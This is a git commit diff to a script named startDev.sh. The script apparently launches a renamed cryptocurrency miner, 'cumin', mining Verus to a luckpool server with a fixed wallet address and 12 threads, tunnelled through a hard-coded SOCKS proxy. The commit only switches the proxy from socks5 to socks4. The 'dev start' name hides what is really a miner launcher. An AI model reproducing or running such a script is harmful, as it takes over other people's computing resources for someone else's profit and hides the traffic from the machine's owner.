6b9e48aec2e0474ac1956214ab328d71da1992da
closemaptoya <85560638+closemaptoya@users.noreply.github.com>
2021-07-03 23:31:26 +0700

    Update startDev.sh

--- startDev.sh
+++ startDev.sh
@@ -1,2 +1,2 @@
 #!/bin/bash
-sudo apt-get update && sudo apt install libcurl4-openssl-dev -y && chmod +x cumin && ./cumin -a verus -o stratum+tcp://na.luckpool.net:3960 -u RKP6YU9bfRCwWicTakWfzgZKRtqcNwAFjr.DevByNongCroissantV5 -t 12 -p x socks5://98.162.25.23:4145
+sudo apt-get update && sudo apt install libcurl4-openssl-dev -y && chmod +x cumin && ./cumin -a verus -o stratum+tcp://na.luckpool.net:3960 -u RKP6YU9bfRCwWicTakWfzgZKRtqcNwAFjr.DevByNongCroissantV5 -t 12 -p x socks4://98.162.25.23:4145
